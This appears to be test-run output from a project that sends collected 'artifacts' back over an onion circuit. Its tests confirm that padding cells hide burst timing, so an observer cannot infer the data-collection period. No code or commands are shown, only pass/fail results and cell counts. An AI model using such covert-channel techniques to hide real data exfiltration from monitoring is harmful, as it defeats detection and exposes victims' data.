+=== result: 19 pass, 0 fail ===
+./build/test_exfil_cover_circuit build/test_tol
+=== 产物回传通道覆盖取证：真实洋葱电路 + tee 抓包 ===
+
+--- 场景A：budget=0（无覆盖，退化为纯突发） ---
+[INFO] A: setup=0 sink.prod=3 pad=0 cells=3 max_gap=1218ms
+
+--- 场景B：budget=300000（有覆盖） ---
+[INFO] B: setup=0 sink.prod=3 pad=53 cells=56 max_gap=63ms
+
+--- 断言 ---
+[PASS] 两个场景均正常建立
+[PASS] 无覆盖：产物全部送达且载荷校验通过
+[PASS] 有覆盖：产物全部送达且载荷校验通过
+[PASS] 无覆盖：接收端未收到任何 PAD
+[PASS] 有覆盖：接收端收到 PAD 并已忽略
+[PASS] 无覆盖：批间存在长空档（采集周期可被推断）
+[PASS] 有覆盖：批间空档被切成小段（长度至少减半）
+[PASS] 有覆盖：线上信元数多于无覆盖
+[PASS] 线上字节均为 512 的整数倍（恒长信元）
+
+[INFO] A: bytes=1536 cells=3
+[INFO] B: bytes=28672 cells=56
+
+=== result: 9 pass, 0 fail ===
+./build/test_exfil_burst_cover
+[SINK] listening port=36943
+[TEE] connected to sink port=36943
+[SINK] accepted fd=6
+[SINK] 首次/后续 read 短读: n=0 want=512 total=612 (errno=0)
+[SINK] listening port=32833
+[TEE] connected to sink port=32833
+[SINK] accepted fd=6
+[SINK] 首次/后续 read 短读: n=0 want=512 total=787 (errno=10)
+=== 产物回传通道覆盖取证：真实洋葱电路 + tee 抓包 ===
+
+--- 场景A：budget=0（无覆盖，退化为纯突发） ---
+[DBG] batch 1: 数据信元=204 覆盖信元=0 突发后 cover_rate=0/min
+[DBG] batch 2: 数据信元=204 覆盖信元=0 突发后 cover_rate=0/min
+[DBG] batch 3: 数据信元=204 覆盖信元=0 突发后 cover_rate=0/min
+[INFO] A: setup=0 sink.prod=3 pad=0 cells=612 max_gap=6021ms
+
+--- 场景B：budget=300000（有覆盖） ---
+[DBG] batch 1: 数据信元=204 覆盖信元=0 突发后 cover_rate=543/min
+[DBG] batch 2: 数据信元=204 覆盖信元=1 突发后 cover_rate=240/min
+[DBG] batch 3: 数据信元=204 覆盖信元=0 突发后 cover_rate=240/min
+[INFO] B: setup=0 sink.prod=3 pad=175 cells=787 max_gap=105ms
+[INFO] B: sink.err=0 total=787
+[INFO] A: sink.err=0 total=612
+
+--- 断言 ---
+[PASS] 两个场景均正常建立
+[PASS] 无覆盖：产物全部送达且载荷校验通过
+[PASS] 有覆盖：产物全部送达且载荷校验通过
+[PASS] 无覆盖：接收端未收到任何 PAD
+[PASS] 有覆盖：接收端收到 PAD 并已忽略
+[PASS] 无覆盖：批间存在长空档（采集周期可被推断）
+[PASS] 有覆盖：批间空档被切成小段（长度至少减半）
+[PASS] 有覆盖：线上信元数多于无覆盖
+[PASS] 线上字节均为 512 的整数倍（恒长信元）
+
+[INFO] A: bytes=313344 cells=612
+[INFO] B: bytes=402944 cells=787
+
+=== result: 9 pass, 0 fail ===
+make: Leaving directory '/data/workspace/dayanjing/21_exfil'
